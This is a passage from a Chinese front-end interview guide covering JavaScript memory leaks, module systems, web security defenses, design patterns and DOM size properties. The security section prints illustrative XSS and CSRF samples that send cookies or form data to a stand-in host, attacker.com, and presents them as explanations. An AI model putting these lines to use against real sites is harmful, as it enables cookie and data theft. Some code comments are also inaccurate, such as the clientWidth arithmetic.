    // 移除元素时没有显式地解绑事件处理程序，可能导致内存泄漏（在 IE 浏览器中）
    element.parentNode.removeChild(element);
```

  6. 使用字符串作为 `setTimeout` 的第一个参数：
```javascript
    setTimeout('console.log("timeout");', 1000);
    // 使用字符串作为参数，会导致内存泄漏（不推荐）
```

注意：以上示例只是为了说明可能导致内存泄漏的操作，并非一定会发生内存泄漏。在实际开发中，需要注意避免这些操作或及时进行相应的内存管理和资源释放。

### 14 XML和JSON的区别？

`XML`（可扩展标记语言）和`JSON`（JavaScript对象表示法）是两种常用的数据格式，它们在以下几个方面有一些区别：

  1. 数据体积方面：

  * `JSON`相对于XML来说，数据的体积小，因为JSON使用了较简洁的语法，所以传输的速度更快。

  2. 数据交互方面：

  * `JSON`与JavaScript的交互更加方便，因为JSON数据可以直接被JavaScript解析和处理，无需额外的转换步骤。
  * `XML`需要使用DOM操作来解析和处理数据，相对而言更复杂一些。

  3. 数据描述方面：

  * `XML`对数据的描述性较强，它使用标签来标识数据的结构和含义，可以自定义标签名，使数据更具有可读性和可扩展性。
  * `JSON`的描述性较弱，它使用简洁的键值对表示数据，适合于简单的数据结构和传递。

  4. 传输速度方面：

  * `JSON`的解析速度要快于`XML`，因为`JSON`的语法更接近JavaScript对象的表示，JavaScript引擎能够更高效地解析JSON数据。

需要根据具体的需求和使用场景选择合适的数据格式，一般来说，如果需要简单、轻量级的数据交互，并且与JavaScript紧密集成，可以选择JSON。而如果需要较强的数据描述性和扩展性，或者需要与其他系统进行数据交互，可以选择XML。

### 15 谈谈你对webpack的看法

Webpack是一个功能强大的模块打包工具，它在现代Web开发中扮演着重要的角色。以下是对Webpack的看法：

  1. **模块化开发** ：Webpack以模块化的方式管理项目中的各种资源，包括JavaScript、CSS、图片、字体等。它能够将这些资源视为模块，并根据模块之间的依赖关系进行打包，使代码结构更清晰、可维护性更高。
  2. **强大的打包能力** ：Webpack具有强大的打包能力，能够将项目中的多个模块打包成一个或多个静态资源文件。它支持各种模块加载器和插件，可以处理各种类型的资源文件，并且能够进行代码压缩、文件合并、按需加载等优化操作，以提高应用的性能和加载速度。
  3. **生态系统丰富** ：Webpack拥有一个庞大的插件生态系统，可以满足各种项目的需求。通过使用各种插件，我们可以实现代码的优化、资源的压缩、自动化部署等功能，大大提升了开发效率。
  4. **开发工具支持** ：Webpack提供了开发工具和开发服务器，支持热模块替换（Hot Module Replacement）等功能，使开发过程更加高效和便捷。它能够实时监听文件的变化并自动重新编译和刷新页面，极大地提升了开发体验。
  5. **社区活跃** ：Webpack拥有一个庞大的社区，开发者们积极分享各种有用的插件和工具，提供了大量的学习资源和解决方案。通过与社区的交流和学习，我们可以更好地了解Webpack的使用技巧和最佳实践。

>
> 总的来说，Webpack是一个非常强大和灵活的模块打包工具，它在现代Web开发中发挥着重要作用。通过Webpack，我们可以更好地组织和管理项目代码，提高开发效率和代码质量，同时也能够享受到丰富的插件和工具支持。

### 16 说说你对AMD和Commonjs的理解

对于AMD（Asynchronous Module Definition）和CommonJS的理解如下：

**1\. AMD（异步模块定义）：**

  * AMD是一种用于浏览器端的模块定义规范。
  * 它支持异步加载模块，允许在模块加载完成后执行回调函数。
  * AMD推荐的风格是通过`define`函数定义模块，并通过返回一个对象来暴露模块的接口。
  * 典型的AMD实现是RequireJS。

**2\. CommonJS：**

  * CommonJS是一种用于服务器端的模块定义规范，Node.js采用了这个规范。
  * 它使用同步加载模块的方式，即只有模块加载完成后才能执行后续操作。
  * CommonJS的风格是通过对`module.exports`或`exports`的属性赋值来暴露模块的接口。
  * CommonJS适用于服务器端的模块加载，因为在服务器端文件的读取是同步的，不会影响性能。

**总结：**

  * AMD和CommonJS是两种不同的模块定义规范，分别适用于浏览器端和服务器端的模块加载。
  * AMD采用异步加载模块的方式，适用于浏览器环境，允许并行加载多个模块，适用于复杂的模块依赖关系。
  * CommonJS采用同步加载模块的方式，适用于服务器环境，因为在服务器端文件的读取是同步的。
  * 在实际开发中，可以根据项目的需求和运行环境选择使用AMD或CommonJS规范来组织和加载模块。

AMD 示例代码：
```javascript
    // 模块定义
    define(['moduleA', 'moduleB'], function(moduleA, moduleB) {
      // 模块代码
      var foo = moduleA.foo();
      var bar = moduleB.bar();
      return {
        baz: function() {
          console.log(foo + bar);
        }
      };
    });
    
    // 模块加载
    require(['myModule'], function(myModule) {
      myModule.baz(); // 调用模块方法
    });
```

CommonJS 示例代码：
```javascript
    // 模块定义
    // moduleA.js
    exports.foo = function() {
      return 'Hello';
    };
    
    // moduleB.js
    exports.bar = function() {
      return 'World';
    };
    
    // 主程序
    // main.js
    var moduleA = require('./moduleA');
    var moduleB = require('./moduleB');
    
    var foo = moduleA.foo();
    var bar = moduleB.bar();
    console.log(foo + ' ' + bar);
```

在浏览器环境下，可以使用RequireJS作为AMD规范的实现库。在Node.js环境下，CommonJS模块加载是内置的，无需使用额外的库。以上示例代码是在浏览器端和Node.js环境中分别使用AMD和CommonJS规范加载模块的简单示例。

### 17 常见web安全及防护原理

常见Web安全问题及对应的防护原理如下所示，并附上相应的示例代码：

**1\. SQL注入**

就是通过把`SQL`命令插入到`Web`表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令

  * 总的来说有以下几点

    * 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双`"-"`进行转换等
    * 永远不要使用动态拼装SQL，可以使用参数化的`SQL`或者直接使用存储过程进行数据查询存取
    * 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
    * 不要把机密信息明文存放，请加密或者`hash`掉密码和敏感的信息
  * 防护原理：

    * 使用参数化查询或预编译语句
    * 使用ORM框架或查询构建器
    * 对用户输入进行输入验证和过滤

示例代码：
```javascript
    // 使用参数化查询
    const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
    db.query(sql, [username, password], (err, result) => {
      // 处理查询结果
    });
    
    // 使用预编译语句
    const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
    const stmt = db.prepare(sql);
    stmt.run(username, password, (err, result) => {
      // 处理查询结果
    });
```

**2\. 跨站脚本攻击 (XSS)**

> `Xss(cross-site
> scripting)`攻击指的是攻击者往`Web`页面里插入恶意`html`标签或者`javascript`代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取`cookie`中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点

  * 防护原理： 
    * 对用户输入进行合适的转义和过滤
    * 使用安全的模板引擎或自动转义函数
    * 使用HTTP头部中的Content Security Policy (CSP)

示例代码：
```javascript
    // 对用户输入进行转义
    function escapeHTML(input) {
      return input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }
    // 使用安全的模板引擎
    const template = Handlebars.compile('{{data}}');
    const html = template({ data: userInput });
    
    // 使用Content Security Policy (CSP)
    res.setHeader('Content-Security-Policy', 'script-src \'self\'');
```

**3\. 跨站请求伪造 (CSRF)**

  * 防护原理： 
    * 使用`CSRF Token`进行验证
    * 验证请求来源
    * 验证`HTTP Referer`头

示例代码：
```javascript
    // 使用CSRF Token进行验证
    app.use((req, res, next) => {
      res.locals.csrfToken = generateCSRFToken();
      next();
    });
    
    // 验证请求来源
    if (req.headers.origin !== 'https://example.com') {
      // 请求不是来自预期的来源，拒绝处理
    }
    
    // 验证HTTP Referer头
    if (req.headers.referer !== 'https://example.com/') {
      // 请求不是来自预期的来源，拒绝处理
    }
```

**XSS与CSRF有什么区别吗？**

XSS（跨站脚本攻击）和 CSRF（跨站请求伪造）是两种不同类型的安全威胁，其区别如下：

**XSS（跨站脚本攻击）：**

  * 目标：获取用户的敏感信息、执行恶意代码。
  * 攻击方式：攻击者向受信任网站注入恶意脚本代码，使用户的浏览器执行该恶意脚本。
  * 攻击原理：XSS攻击利用了网页应用对用户输入的信任，通过注入恶意脚本代码，使其在用户的浏览器中执行。
  * 防护措施：对用户输入进行合适的转义和过滤，使用安全的模板引擎或自动转义函数，使用Content Security Policy（CSP）等。

**CSRF（跨站请求伪造）：**

  * 目标：利用用户的身份完成恶意操作，而不是获取敏感信息。
  * 攻击方式：攻击者诱使用户在受信任网站的身份下执行恶意操作，利用用户在受信任网站上的身份发送恶意请求。
  * 攻击原理：CSRF攻击利用了网页应用对用户已认证身份的信任，通过伪造请求，利用用户的身份在受信任网站上执行恶意操作。
  * 防护措施：使用CSRF Token进行验证，验证请求来源、HTTP Referer头，双重提交Cookie验证等。

**总结：**

  * XSS攻击注重利用网页应用对用户输入的信任，目标是获取用户的敏感信息和执行恶意代码。
  * CSRF攻击注重利用网页应用对用户已认证身份的信任，目标是代替用户完成指定的动作。

请注意，为了有效地防止XSS和CSRF攻击，应采用综合的安全措施，并进行定期的安全审查和测试。

**XSS攻击获取Cookie的示例**
```html
    <!-- index.html -->
    <!DOCTYPE html>
    <html>
    <head>
      <title>XSS Attack Demo</title>
    </head>
    <body>
      <h1>XSS Attack Demo</h1>
      <div id="content"></div>
      <script src="payload.js"></script>
    </body>
    </html>
```  
```javascript
    // payload.js
    const maliciousScript = `
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
      xhr.send();
    `;
    
    document.getElementById('content').innerHTML = maliciousScript;
```

在上述示例中，恶意脚本`payload.js`被注入到页面中。该脚本通过`XMLHttpRequest`发送GET请求，将页面中的Cookie信息发送给攻击者控制的服务器。

**CSRF攻击的示例**
```html
    <!-- index.html -->
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSRF Attack Demo</title>
    </head>
    <body>
      <h1>CSRF Attack Demo</h1>
      <form id="transfer-form" action="http://bank.com/transfer" method="POST">
        <input type="hidden" name="amount" value="10000">
        <input type="submit" value="Transfer">
      </form>
      <script src="payload.js"></script>
    </body>
    </html>
```  
```javascript
    // payload.js
    const maliciousScript = `
      const form = document.getElementById('transfer-form');
      form.action = 'http://attacker.com/steal-data';
      form.submit();
    `;
    
    eval(maliciousScript);
```

在上述示例中，恶意脚本`payload.js`被执行。该脚本修改了表单`transfer-
form`的目标地址为攻击者控制的服务器，并提交表单。当用户点击"Transfer"按钮时，实际上会向攻击者服务器发送用户的敏感数据。

请注意，以上示例仅为了说明XSS攻击和CSRF攻击的原理，并非真实的攻击代码。在实际开发中，应该采取相应的防护措施来预防这些安全威胁，如输入验证、输出编码、使用CSRF令牌等。

**4\. 文件上传漏洞**

  * 防护原理：
  * 验证文件类型和大小
  * 存储上传的文件在非Web可访问目录下
  * 生成唯一且安全的文件名

示例代码：
```javascript
    // 验证文件类型和大小
    const allowedFileTypes = ['image/jpeg', 'image/png'];
    const maxFileSize = 5 * 1024 * 1024; // 5MB
    
    if (!allowedFileTypes.includes(file.mimetype) || file.size > maxFileSize) {
     // 文件类型不合法或大小超过限制，拒绝上传
    }
```

**5\. 会话劫持和会话固定**

  * 防护原理： 
    * 使用安全的会话管理机制（如使用HTTPS、使用HTTP Only和Secure标志的Cookie）
    * 生成随机且复杂的会话ID
    * 定期更新会话ID

示例代码：
```javascript
    // 设置HTTP Only和Secure标志的会话Cookie
    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true });
    
    // 生成随机且复杂的会话ID
    const sessionID = generateSessionID();
    
    // 定期更新会话ID
    setInterval(() => {
      // 生成新的会话ID
      const newSessionID = generateSessionID();
      // 更新会话ID
      req.sessionID = newSessionID;
    }, 30 * 60 * 1000); // 30分钟更新一次会话ID
```

**6\. 点击劫持**

  * 防护原理：
  * 使用`X-Frame-Option`s响应头
  * 使用`Content Security Policy (CSP)`
  * 使用`Framebusting`脚本

示例代码：
```javascript
    // 使用X-Frame-Options响应头
    res.setHeader('X-Frame-Options', 'DENY');
    
    // 使用Content Security Policy (CSP)
    res.setHeader('Content-Security-Policy', 'frame-ancestors \'none\'');
    
    // 使用Framebusting脚本
    if (window.top !== window.self) {
     window.top.location = window.self.location;
    }
```

**7\. 不安全的重定向和跳转**

  * 防护原理：
  * 对重定向URL进行白名单验证
  * 验证跳转请求的合法性
  * 使用HTTP Only和Secure标志的Cookie

示例代码：
```javascript
    // 对重定向URL进行白名单验证
    const whitelist = ['https://example.com', 'https://example.net'];
    if (whitelist.includes(redirectURL)) {
     res.redirect(redirectURL);
    } else {
     // 非法的重定向URL，拒绝跳转
    }
    
    // 验证跳转请求的合法性
    const referer = req.headers.referer;
    if (referer && referer.startsWith('https://example.com')) {
     res.redirect(redirectURL);
    } else {
     // 非法的跳转请求，拒绝跳转
    }
    
    // 使用HTTP Only和Secure标志的Cookie
    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true });
```

### 18 用过哪些设计模式？

当被问到你用过哪些设计模式时，你可以列举出你在前端开发中常使用的设计模式。以下是几个常见的设计模式，以及它们的优缺点、适用场景和示例代码：

**1\. 工厂模式（Factory Pattern）：**

  * 优点：封装了对象的创建过程，降低了耦合性，提供了灵活性和可扩展性。
  * 缺点：增加了代码的复杂性，需要创建工厂类。
  * 适用场景：当需要根据不同条件创建不同对象时，或者需要隐藏对象创建的细节时，可以使用工厂模式。

示例代码：
```javascript
    class Button {
      constructor(text) {
        this.text = text;
      }
      render() {
        console.log(`Rendering button with text: ${this.text}`);
      }
    }
    
    class ButtonFactory {
      createButton(text) {
        return new Button(text);
      }
    }
    
    const factory = new ButtonFactory();
    const button = factory.createButton('Submit');
    button.render(); // Output: Rendering button with text: Submit
```

**2\. 单例模式（Singleton Pattern）：**

  * 优点：确保一个类只有一个实例，节省系统资源，提供全局访问点。
  * 缺点：可能引入全局状态，不利于扩展和测试。
  * 适用场景：当需要全局唯一的对象实例时，例如日志记录器、全局配置对象等，可以使用单例模式。

示例代码：
```javascript
    class Logger {
      constructor() {
        if (Logger.instance) {
          return Logger.instance;
        }
        Logger.instance = this;
      }
      log(message) {
        console.log(`Logging: ${message}`);
      }
    }
    
    const logger1 = new Logger();
    const logger2 = new Logger();
    
    console.log(logger1 === logger2); // Output: true
```

**3\. 观察者模式（Observer Pattern）：**

  * 优点：实现了对象之间的松耦合，支持广播通信，当一个对象状态改变时，可以通知依赖它的其他对象进行更新。
  * 缺点：可能导致性能问题和内存泄漏，需要合理管理观察者列表。
  * 适用场景：当需要实现对象之间的一对多关系，一个对象的改变需要通知其他多个对象时，可以使用观察者模式。

示例代码：
```javascript
    class Subject {
      constructor() {
        this.observers = [];
      }
      addObserver(observer) {
        this.observers.push(observer);
      }
      removeObserver(observer) {
        const index = this.observers.indexOf(observer);
        if (index !== -1) {
          this.observers.splice(index, 1);
        }
      }
      notify(message) {
        this.observers.forEach((observer) => observer.update(message));
      }
    }
    
    class Observer {
      update(message) {
        console.log(`Received message: ${message}`);
      }
    }
    
    const subject = new Subject();
    const observer1 = new Observer();
    const observer2 = new Observer();
    
    subject.addObserver(observer1);
    subject.addObserver(observer2);
    subject.notify('Hello, observers!'); // Output
```

**4\. 发布订阅模式（Publish-Subscribe Pattern）：**

  * 优点：解耦了发布者和订阅者，使它们可以独立变化。增加了代码的灵活性和可维护性。
  * 缺点：可能会导致发布者过度发布消息，造成性能问题。订阅者需要订阅和取消订阅相关的逻辑。
  * 适用场景：当存在一对多的关系，一个对象的状态变化需要通知多个其他对象时，可以使用发布订阅模式。

示例代码：
```javascript
    class PubSub {
      constructor() {
        this.subscribers = {};
      }
      subscribe(event, callback) {
        if (!this.subscribers[event]) {
          this.subscribers[event] = [];
        }
        this.subscribers[event].push(callback);
      }
      unsubscribe(event, callback) {
        const subscribers = this.subscribers[event];
        if (subscribers) {
          this.subscribers[event] = subscribers.filter(cb => cb !== callback);
        }
      }
      publish(event, data) {
        const subscribers = this.subscribers[event];
        if (subscribers) {
          subscribers.forEach(callback => callback(data));
        }
      }
    }
    
    // 创建发布订阅对象
    const pubsub = new PubSub();
    
    // 订阅事件
    const callback1 = data => console.log('Subscriber 1:', data);
    const callback2 = data => console.log('Subscriber 2:', data);
    pubsub.subscribe('event1', callback1);
    pubsub.subscribe('event1', callback2);
    
    // 发布事件
    pubsub.publish('event1', 'Hello, world!');
    
    // 取消订阅事件
    pubsub.unsubscribe('event1', callback2);
    
    // 再次发布事件
    pubsub.publish('event1', 'Hello again!');
```

在上述示例中，`PubSub` 是发布订阅的实现类，它维护一个订阅者列表 `subscribers`，用于存储不同事件的订阅者列表。通过
`subscribe` 方法订阅事件，将回调函数添加到对应事件的订阅者列表中；通过 `unsubscribe`
方法取消订阅事件，从对应事件的订阅者列表中移除回调函数；通过 `publish`
方法发布事件，遍历对应事件的订阅者列表，依次执行回调函数。通过发布订阅模式，发布者和订阅者之间解耦，可以实现松散耦合的组件间通信。

发布订阅模式适用于许多场景，如事件驱动的系统、消息队列、UI组件间的通信等，可以实现组件之间的解耦和灵活性。

**发布订阅模式（Publish-Subscribe Pattern）和观察者模式（Observer
Pattern）是两种常见的设计模式，它们有一些相似之处，但也存在一些区别。**

相似之处：

  * 都用于实现对象之间的消息通信和事件处理。
  * 都支持解耦，让发布者和订阅者（观察者）之间相互独立。

区别：

  * 关注点不同：观察者模式关注的是一个主题对象（被观察者）和多个观察者对象之间的关系。当主题对象的状态发生变化时，它会通知所有观察者对象进行更新。而发布订阅模式关注的是发布者和订阅者之间的关系，发布者将消息发送到一个中心调度器（或者称为事件总线），然后由调度器将消息分发给所有订阅者。
  * 中间件存在与否：发布订阅模式通常需要一个中间件（调度器或事件总线）来管理消息的发布和订阅，这样发布者和订阅者之间的通信通过中间件进行。而观察者模式则直接在主题对象和观察者对象之间进行通信，没有中间件的参与。
  * 松散耦合程度不同：观察者模式中，主题对象和观察者对象之间是直接关联的，主题对象需要知道每个观察者对象的存在。而在发布订阅模式中，发布者和订阅者之间并不直接关联，它们只与中间件进行通信，发布者和订阅者之间的耦合更加松散。

观察者模式示例：
```javascript
    class Subject {
      constructor() {
        this.observers = [];
      }
      addObserver(observer) {
        this.observers.push(observer);
      }
      removeObserver(observer) {
        this.observers = this.observers.filter(obs => obs !== observer);
      }
      notify(data) {
        this.observers.forEach(observer => observer.update(data));
      }
    }
    
    class Observer {
      update(data) {
        console.log('Received data:', data);
      }
    }
    
    // 创建主题对象
    const subject = new Subject();
    
    // 创建观察者对象
    const observer1 = new Observer();
    const observer2 = new Observer();
    
    // 添加观察者
    subject.addObserver(observer1);
    subject.addObserver(observer2);
    
    // 发送通知
    subject.notify('Hello, observers!');
```

发布订阅模式示例：
```javascript
    class EventBus {
      constructor() {
        this.subscribers = {};
      }
      subscribe(event, callback) {
        if (!this.subscribers[event]) {
          this.subscribers[event] = [];
        }
        this.subscribers[event].push(callback);
      }
      unsubscribe(event, callback) {
        const subscribers = this.subscribers[event];
        if (subscribers) {
          this.subscribers[event] = subscribers.filter(cb => cb !== callback);
        }
      }
      publish(event, data) {
            const subscribers = this.subscribers[event];
          if (subscribers) {
            subscribers.forEach(callback => callback(data));
          }
        }
      }
    
      // 创建事件总线对象
      const eventBus = new EventBus();
    
      // 订阅事件
      eventBus.subscribe('message', data => {
        console.log('Received message:', data);
      });
    
      // 发布事件
      eventBus.publish('message', 'Hello, subscribers!');
```

在上述示例中，观察者模式中的Subject类相当于发布订阅模式中的EventBus类，Observer类相当于订阅者（观察者），notify方法相当于publish方法，update方法相当于订阅者接收到事件后的回调函数。

观察者模式和发布订阅模式都是常见的用于实现事件处理和消息通信的设计模式，根据实际场景和需求选择合适的模式进行使用。观察者模式更加简单直接，适用于一对多的关系，而发布订阅模式更加灵活，可以支持多对多的关系，并且通过中间件来解耦发布者和订阅者。

**4\. 原型模式（Prototype Pattern）：**

  * 优点：通过克隆现有对象来创建新对象，避免了频繁的对象创建过程，提高了性能。
  * 缺点：需要正确设置原型对象和克隆方法，可能引入深拷贝或浅拷贝的问题。
  * 适用场景：当创建对象的成本较大且对象之间相似度较高时，可以使用原型模式来复用已有对象。

示例代码：
```javascript
    class Shape {
      constructor() {
        this.type = '';
      }
      clone() {
        return Object.create(this);
      }
      draw() {
        console.log(`Drawing a ${this.type}`);
      }
    }
    
    const circlePrototype = new Shape();
    circlePrototype.type = 'Circle';
    
    const squarePrototype = new Shape();
    squarePrototype.type = 'Square';
    
    const circle = circlePrototype.clone();
    circle.draw(); // Output: Drawing a Circle
    
    const square = squarePrototype.clone();
    square.draw(); // Output: Drawing a Square
```

**6\. 装饰者模式（Decorator Pattern）**

  * 优点：动态地给对象添加新的功能，避免了使用子类继承的方式导致类爆炸的问题。
  * 缺点：增加了代码的复杂性，需要理解和管理装饰器的层次结构。
  * 适用场景：当需要在不修改现有对象结构的情况下，动态地添加功能或修改行为时，可以使用装饰者模式。

示例代码：
```javascript
    class Component {
      operation() {
        console.log('Component operation');
      }
    }
    
    class Decorator {
      constructor(component) {
        this.component = component;
      }
      operation() {
        this.component.operation();
      }
    }
    
    class ConcreteComponent extends Component {
      operation() {
        console.log('ConcreteComponent operation');
      }
    }
    
    class ConcreteDecoratorA extends Decorator {
      operation() {
        super.operation();
        console.log('ConcreteDecoratorA operation');
      }
    }
    
    class ConcreteDecoratorB extends Decorator {
      operation() {
        super.operation();
        console.log('ConcreteDecoratorB operation');
      }
    }
    
    const component = new ConcreteComponent();
    const decoratorA = new ConcreteDecoratorA(component);
    const decoratorB = new ConcreteDecoratorB(decoratorA);
    
    decoratorB.operation();
    // Output:
    // Component operation
    // ConcreteComponent operation
    // ConcreteDecoratorA operation
    // ConcreteDecoratorB operation
```

**7\. 适配器模式（Adapter Pattern）：**

  * 优点：允许不兼容接口的对象协同工作，提高代码的复用性和灵活性。
  * 缺点：增加了代码的复杂性，需要理解和管理适配器的转换过程。
  * 适用场景：当需要将一个类的接口转换成客户端所期望的另一个接口时，可以使用适配器模式。

示例代码：
```javascript
    class Target {
      request() {
        console.log('Target request');
      }
    }
    
    class Adaptee {
      specificRequest() {
        console.log('Adaptee specificRequest');
      }
    }
    
    class Adapter extends Target {
      constructor(adaptee) {
        super();
        this.adaptee = adaptee;
      }
      request() {
        this.adaptee.specificRequest();
      }
    }
    
    const target = new Target();
    target.request();
    // Output: Target request
    
    const adaptee = new Adaptee();
    const adapter = new Adapter(adaptee);
    adapter.request();
    // Output: Adaptee specificRequest
```

在上述示例中，`Target` 定义了客户端所期望的接口，`Adaptee` 是一个已有的类，它的接口与 `Target` 不兼容。适配器
`Adapter` 继承自 `Target`，并在其内部持有一个 `Adaptee` 的引用，通过适配器的 `request` 方法调用 `Adaptee`
的 `specificRequest` 方法，从而实现了对不兼容接口的适配。客户端可以通过调用适配器的 `request` 方法来使用 `Adaptee`
的功能。

适配器模式可以用于许多场景，例如在使用第三方库时需要将其接口转换成符合自己代码规范的接口，或者在对旧系统进行重构时需要兼容旧代码和新代码之间的差异。

### 19 为什么要有同源限制？

>   * 同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议
>   *
> 举例说明：比如一个黑客程序，他利用`Iframe`把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过`Javascript`读取到你的表单中`input`中的内容，这样用户名，密码就轻松到手了。
>

同源限制是为了保护用户的隐私和安全而存在的。它的主要目的是防止恶意网站利用客户端脚本对其他网站的信息进行读取和操作，从而避免信息泄露和恶意攻击。

同源策略通过限制来自不同源的网页之间的交互，确保只有同源的网页可以相互访问彼此的资源。同源策略要求协议、域名和端口必须完全相同才能实现同源。如果不满足同源条件，浏览器会禁止跨域请求和操作。

**同源限制的作用包括但不限于：**

  1. **防止跨站点脚本攻击（XSS）** ：同源限制可以防止恶意网站通过跨域脚本注入攻击来获取用户敏感信息或操作用户的账户。
  2. **防止跨站请求伪造（CSRF）** ：同源限制可以防止恶意网站伪造用户请求，以用户的身份执行非法操作。
  3. **保护用户隐私** ：同源限制可以防止其他网站通过跨域方式获取用户在当前网站的敏感信息。

同源限制通过浏览器的安全策略实现，确保在不同源的网页之间存在一定的隔离性，提高用户的安全性和隐私保护。但同时也给一些特定的跨域场景带来了限制，因此在需要跨域访问的情况下，可以使用跨域技术（如跨域资源共享CORS、JSONP等）来解决问题。

示例代码中提到的黑客程序利用了跨域嵌套iframe的方式，通过读取用户输入的信息来进行攻击。同源限制可以防止这种攻击，因为该黑客程序的域名与银行登录页面的域名不同，无法通过跨域访问获取用户输入的敏感信息。

### 20
offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别

  * `offsetWidth/offsetHeight`：返回元素的总宽度/高度，包括内容宽度、内边距和边框宽度。该值包含了元素的完整尺寸，包括隐藏的部分和滚动条占用的空间。
  * `clientWidth/clientHeight`：返回元素的可视区域宽度/高度，即内容区域加上内边距，但不包括滚动条的宽度。该值表示元素内部可见的部分尺寸。
  * `scrollWidth/scrollHeight`：返回元素内容的实际宽度/高度，包括内容区域的尺寸以及溢出内容的尺寸。如果内容没有溢出，则与`clientWidth/clientHeight`的值相同。

**区别总结：**

  * `offsetWidth/offsetHeight`包含了元素的边框和滚动条占用的空间，提供了元素的完整尺寸。
  * `clientWidth/clientHeight`只包含元素的内容区域和内边距，不包括滚动条，表示了元素内部可见的部分尺寸。
  * `scrollWidth/scrollHeight`包含了元素内容的实际宽度/高度，包括溢出内容的尺寸。

示例代码：
```html
    <style>
      #box {
        width: 200px;
        height: 200px;
        padding: 20px;
        border: 2px solid black;
        overflow: scroll;
      }
      #content {
        width: 400px;
        height: 400px;
      }
    </style>
    
    <div id="box">
      <div id="content"></div>
    </div>
    
    <script>
      var box = document.getElementById('box');
      console.log('offsetWidth:', box.offsetWidth); // 224 (200 + 20 + 2 + 2)
      console.log('offsetHeight:', box.offsetHeight); // 224 (200 + 20 + 2 + 2)
    
      console.log('clientWidth:', box.clientWidth); // 200 (200 + 20 + 20)
      console.log('clientHeight:', box.clientHeight); // 200 (200 + 20 + 20)
    
      console.log('scrollWidth:', box.scrollWidth); // 400 (content的宽度)
      console.log('scrollHeight:', box.scrollHeight); // 400 (content的高度)
    </script>
```

在上面的示例中，`box`元素的尺寸为200px × 200px，有20px的内边距和2px的边框。内部的`content`元素的尺寸为`400px ×
400px`，超出了父元素的尺寸。通过不同的属性获取到的值可以看到它们的差异。

**小结**

  * `offsetWidth/offsetHeight`返回值包含**content + padding + border** ，效果与`e.getBoundingClientRect()`相同
  * `clientWidth/clientHeight`返回值只包含**content + padding** ，如果有滚动条，也**不包含滚动条**
  * `scrollWidth/scrollHeight`返回值包含**content + padding + 溢出内容的尺寸**

### 21 javascript有哪些方法定义对象

  * 对象字面量： `var obj = {};` 原型是`Object.prototype`
  * 构造函数： `var obj = new Object();`
  * `Object.create()`: `var obj = Object.create(Object.prototype);`
    * `Object.create(null)` 没有原型
    * `Object.create({...})` 可指定原型

**1\. 字面量表示法（Literal Notation）：**

使用对象字面量 `{}` 直接创建对象，并在其中定义属性和方法。
```javascript
    const person = {
      name: 'poetry',
      age: 30,
      sayHello: function() {
        console.log('Hello!');
      }
    };
```

**2\. 构造函数（Constructor）：**

使用构造函数创建对象，可以定义一个构造函数，然后使用 `new` 关键字实例化对象。
```javascript
    function Person(name, age) {
      this.name = name;
      this.age = age;
      this.sayHello = function() {
        console.log('Hello!');
      };
    }
    
    const person = new Person('poetry', 30);
```

**3.`Object.create()` 方法：**

使用`Object.create()`方法创建一个新对象，并将指定的原型对象设置为新对象的原型。可以传入一个原型对象作为参数，也可以传入`null`作为参数来创建没有原型的对象。
```javascript
    const personPrototype = {
      sayHello: function() {
        console.log('Hello!');
      }
    };
    
    const person = Object.create(personPrototype);
    person.name = 'poetry';
    person.age = 30;
```

**4.`class` 关键字（ES6引入）：**

使用 `class` 关键字可以定义类，并通过 `new` 关键字实例化对象。
```javascript
    class Person {
     constructor(name, age) {
       this.name = name;
       this.age = age;
     }
    
     sayHello() {
       console.log('Hello!');
     }
    }
    
    const person = new Person('poetry', 30);
```

**5\. 工厂函数（Factory Function）：**

使用一个函数来封装创建对象的逻辑，并返回新创建的对象。
```javascript
    function createPerson(name, age) {
      const person = {};
      person.name = name;
      person.age = age;
      person.sayHello = function() {
        console.log('Hello!');
      };
      return person;
    }
    
    const person = createPerson('poetry', 30);
```

**6\. 原型（Prototype）：**

在 JavaScript 中，每个对象都有一个原型（prototype），可以通过原型链来继承属性和方法。
```javascript
    function Person(name, age) {
      this.name = name;
      this.age = age;
    }
    
    Person.prototype.sayHello = function() {
      console.log('Hello!');
    };
    
    const person = new Person('poetry', 30);
```

**7.`Object.assign()` 方法：**

使用 `Object.assign()` 方法可以将一个或多个源对象的属性复制到目标对象中，从而创建一个新对象。
```javascript
    const person1 = {
      name: 'poetry',
      age: 30
    };
    
    const person2 = {
      sayHello: function() {
        console.log('Hello!');
      }
    };
    
    const person = Object.assign({}, person1, person2);
```

### 22 常见兼容性问题？

常见的兼容性问题有很多，以下列举一些常见的问题：

  1. **浏览器的盒模型差异** ：不同浏览器对盒模型的解析存在差异，导致元素的尺寸计算不一致。可以使用CSS盒模型属性（`box-sizing`）来进行控制。
  2. **浏览器对CSS属性的支持差异** ：不同浏览器对CSS属性的支持程度不同，某些属性在某些浏览器中可能不起作用或解析不正确。需要使用CSS前缀（Vendor Prefix）或使用兼容性方案来处理。
  3. **JavaScript API的差异** ：不同浏览器对JavaScript API的支持存在差异，某些方法、属性或事件在某些浏览器中可能不可用或行为不同。需要进行兼容性检测并使用替代方案或进行特定的处理。
  4. **样式的兼容性** ：不同浏览器对样式的解析存在差异，可能导致页面显示不一致。需要针对不同浏览器进行样式的调整和优化。
  5. **图片格式的兼容性** ：不同浏览器对图片格式的支持存在差异，某些格式在某些浏览器中可能不被支持或显示异常。需要根据需求选择合适的图片格式，并进行兼容性处理。
  6. **事件处理的差异** ：不同浏览器对事件的处理存在差异，例如事件对象的属性、方法、坐标获取等方面。需要进行兼容性处理，使用合适的方法来获取事件相关信息。

示例代码：
```javascript
